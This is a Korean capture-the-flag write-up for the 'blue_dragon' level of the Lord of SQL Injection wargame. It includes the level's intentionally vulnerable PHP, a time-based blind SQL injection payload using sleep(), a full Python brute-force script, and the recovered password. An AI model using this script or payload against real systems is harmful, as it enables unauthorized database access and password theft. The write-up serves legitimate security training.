---
title: "[Lord of SQL Injection] LoS - blue_dragon 문제풀이"
date: 2018-09-09
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

드디어 용 시리즈의 마지막인 `blue_dragon`이다.
내가 바보임을 다시 한 번 깨달을 수 있었던 문제였다.  

<!--more-->

코드는 다음과 같다.  

```php
--------------------------------------------------------------------------------------
query : select id from prob_blue_dragon where id='' and pw=''
--------------------------------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\./i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\./i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if(preg_match('/\'|\\\/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/\'|\\\/i', $_GET[pw])) exit("No Hack ~_~");
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("blue_dragon");
  highlight_file(__FILE__);
?>
```

단순히 필터링만 보자면 `'(싱글쿼터)`와 여태까지 싱글쿼터가 필터링이었을 때 사용했던 `\`을 사용하지 못하도록 되어 있다.
그런데 필터링을 걸어 둔 위치가 좀 다르다.
쿼리를 실행시킨 후에 필터링을 검사하고 이에 대한 결과를 출력한다.

그래서 `'`를 사용한다면 쿼리의 결과를 `Hello admin`의 형태로는 확인할 수 없겠지만, 어찌됬든 쿼리가 실행은 되므로 `Time Based Blind SQL Injection`을 사용할 수 있다.
테스트로 `id=a&pw=' or id='admin' and if(length(pw)>0, sleep(3), 0)#`을 입력 해 보았다.
그랬더니 약 3초 간 지연 후에 내가 입력 한 쿼리와 함께 `No Hack ~_~`을 출력하는 결과 화면을 볼 수 있었다.
정상적으로 쿼리가 동작하므로 pw의 길이와 값을 알아내기 위해 아래와 같이 코드를 구현했다.  

```python
import requests
import time

flag = ""
length = 0

url = "http://los.rubiya.kr/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id=a&pw=' or id='admin' and"
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 40):
	try:
		start = time.time()
		query = url + " if(length(pw) = " + str(i) + ", sleep(3), 0)%23"
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue
	if (time.time() - start) > 3:
		length = i
		break	

print "[+] Found length : ", length

print "[+] Find password"
	
for j in range(1, length + 1):
	for i in range(48, 123):
		try:
			start = time.time()
			query = url + " if(substr(pw, " + str(j) + ", 1) = " + hex(i) + ", sleep(3), 0)%23"
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if (time.time() - start) > 3:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

내 서버가 너무 느려서 도대체 결과가 안나오길래 쿼리가 잘못된 것인가 고민했었다.
그런데 학교 다닐 때 쓰던 동아리 서버에서 돌렸더니 너무 잘돌아간다 ㅎㅎ
서버를 바꾸던가 해야지 원...
어찌됬건 결과는 다음과 같다.

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  8
[+] Find password
[+] Found 1 : D
[+] Found 2 : D9
[+] Found 3 : D94
[+] Found 4 : D948
[+] Found 5 : D948B
[+] Found 6 : D948B8
[+] Found 7 : D948B8A
[+] Found 8 : D948B8A0
[+] Found password :  D948B8A0
[+] End
```

역시나 소문자로 입력 해 주면 문제를 풀 수 있다.  

```plain
?pw=d948b8a0
```

---

```php
---------------------------------------------------------------------------------------------------
query : select id from prob_blue_dragon where id='' and pw='d948b8a0'
---------------------------------------------------------------------------------------------------

BLUE_DRAGON Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\./i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\./i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if(preg_match('/\'|\\\/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/\'|\\\/i', $_GET[pw])) exit("No Hack ~_~");
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>";

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("blue_dragon");
  highlight_file(__FILE__);
?>
```

---

```plain
BLUE_DRAGON Clear!!
```